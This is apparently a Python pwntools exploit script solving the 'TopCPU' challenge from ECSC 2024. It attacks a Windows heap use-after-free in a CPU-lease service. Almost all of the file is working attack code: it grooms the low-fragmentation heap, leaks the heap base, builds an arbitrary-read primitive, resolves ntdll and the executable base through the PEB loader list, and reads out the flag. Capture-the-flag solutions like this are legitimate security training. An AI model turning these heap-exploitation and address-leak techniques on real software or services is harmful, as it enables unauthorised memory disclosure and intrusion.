#!/usr/bin/env python3

import logging
import os
from pwn import *
from time import time, sleep

logging.disable()

HOST = os.environ.get("HOST", "topcpu.challs.jeopardy.ecsc2024.it")
PORT = int(os.environ.get("PORT", 1107))

context.update(arch='amd64')
exe = '../src/TopCPU.exe'


def start(argv=[], *a, **kw):
    if args.LOCAL:
        return process([exe] + argv, *a, **kw)
    return remote(HOST, PORT)


start_time = int(time())
io = None


def timestamp():
    global start_time
    start_time += 2
    return start_time


def create(client_id, cores=1):
    global io
    io.sendlineafter(b"> ", b"1")
    io.sendlineafter(b"Timestamp: ", str(timestamp()).encode())
    io.sendlineafter(b"Duration: ", str(1).encode())
    io.sendlineafter(b"Cores: ", str(cores).encode())
    io.sendlineafter(b"Client id: ", client_id)
    io.recvuntil(b"Lease id: ")
    res = int(io.recvuntil(b",", drop=True).decode())
    return res


def cancel(id):
    global io
    io.sendlineafter(b"> ", b"2")
    io.sendlineafter(b"Lease id: ", str(id).encode())


def list():
    global io
    io.sendlineafter(b"> ", b"3")
    res = io.recvuntil(b"> ", drop=True)
    io.unrecv(b"> ")
    return res


RECLAIM_ID = 0x1338


def read(where, size=8):
    string = p64(RECLAIM_ID)
    string += p64(where)
    string += p64(0)
    string += p64(size)
    string += p64(0x100)
    id = create(string)
    res = list()
    assert f"Lease {RECLAIM_ID}".encode() in res
    cancel(id)
    return res.split(f"Lease {RECLAIM_ID} | client id ".encode())[1][:size]


def read_64(where):
    return u64(read(where))


def do_exploit():
    global io

    io = start()

    io.timeout = 1

    N_CPUS = 2
    N_CORES = [2] * N_CPUS
    PRICES = [0.1] * N_CPUS

    io.sendlineafter(b"in your cluster: ", str(N_CPUS).encode())
    io.sendlineafter(b"for each CPU: ", " ".join([f"{seat} {price}" for seat, price in zip(N_CORES, PRICES)]).encode())

    LFH_SIZE = 30
    for _ in range(LFH_SIZE):
        create(b"A" * 2)

    # Step 1: heap leak
    cancel(0)
    cancel(1)

    uaf_id_1 = create(b"B" * 0x2, 4)
    uaf_id_2 = create(b"B" * 0x2, 4)
    cancel(uaf_id_1)
    cancel(uaf_id_2)

    RECLAIM_ID = 0x1337
    print("[.] leaking heap")
    string = p64(RECLAIM_ID)
    string += b"C" * 16
    string += p64(0x8)
    string += p64(0xf)
    id = create(string)

    res = list()
    assert f"Lease {RECLAIM_ID}".encode() in res
    cancel(RECLAIM_ID)  # This will free the string
    create(b"D" * 0x100)  # Allocate a lease with a big string so that it contains a pointer

    heap_leak = u64(list().split(f"Lease {id} | client id ".encode())[1][8:16])
    print(f"[+] heap leak: {hex(heap_leak)}")

    heap_base = heap_leak & 0xffffffffffff0000
    print(f"[+] heap base: {hex(heap_base)}")

    # Step 2: arb read primitive
    cancel(2)
    cancel(3)

    uaf_id_1 = create(b"B" * 0x2, 4)
    uaf_id_2 = create(b"B" * 0x2, 4)
    cancel(uaf_id_1)
    cancel(uaf_id_2)

    SEGMENT_SIGNATURE = 0xffeeffee
    SegmentSignature = read_64(heap_base + 0x10)
    assert SegmentSignature & 0xffffffff == SEGMENT_SIGNATURE

    _HEAP_LOCK = heap_base + 0x160

    Lock_ptr = read_64(_HEAP_LOCK)
    print(f"[+] Lock_ptr: {hex(Lock_ptr)}")

    DebugInfo = read_64(Lock_ptr)
    print(f"[+] DebugInfo: {hex(DebugInfo)}")

    ntdll = DebugInfo - (0x7ff83a9f1f90 - 0x7ff83a880000)
    print(f"[+] ntdll: {hex(ntdll)}")

    PebLdr = ntdll + (0x7ff83a9f3140 - 0x7ff83a880000)

    ModuleList = PebLdr + 0x10

    module = read_64(ModuleList)
    DllBase = read_64(module + 0x30)
    print(f"[+] DllBase: {hex(DllBase)}")

    TopCPU = DllBase

    print(f"[+] TopCPU.exe base: {hex(TopCPU)}")
    Flag = TopCPU + (0x7ff6793d9d00 - 0x7ff679390000)
    print(f"[+] Flag: {hex(Flag)}")

    '''
    0x0: ptr / data
    0x8: data
    0x10: size
    0x18: capacity
    '''
    Flag_size = read_64(Flag + 0x10)
    Flag_capacity = read_64(Flag + 0x18)
    print(f"[+] Flag size: {hex(Flag_size)}")
    print(f"[+] Flag capacity: {hex(Flag_capacity)}")

    if Flag_capacity > 0xf:
        Flag_ptr = read_64(Flag)
    else:
        Flag_ptr = Flag
    print(f"[+] Flag ptr: {hex(Flag_ptr)}")

    flag = read(Flag_ptr, Flag_size)
    print(flag.decode())


for _ in range(5):
    try:
        do_exploit()
        break
    except Exception as e:
        print(e)
        if io:
            try:
                io.close()
            except:
                pass
        sleep(1)
